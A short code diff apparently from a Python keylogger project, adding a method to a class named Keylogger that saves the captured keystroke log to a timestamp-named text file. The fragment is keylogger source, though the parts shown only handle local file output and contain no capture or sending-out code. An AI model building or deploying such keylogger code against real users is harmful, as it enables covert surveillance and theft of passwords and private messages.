@@ -30,6 +30,15 @@ class Keylogger:
 
         self.log += name
 
+    def reportToFile(self):
+        """
+            This method creates a log file in the current directory that contains
+            the current keylogs in the `self.log` variable
+        """
+        with open(f"{self.filename}.txt", "w") as f:
+            print(self.log, file=f)
+        print(f"[+] Saved {self.filename}.txt")
+
     def updateFilename(self):
         """
             Construct the filename to be identified by start & end datetimes
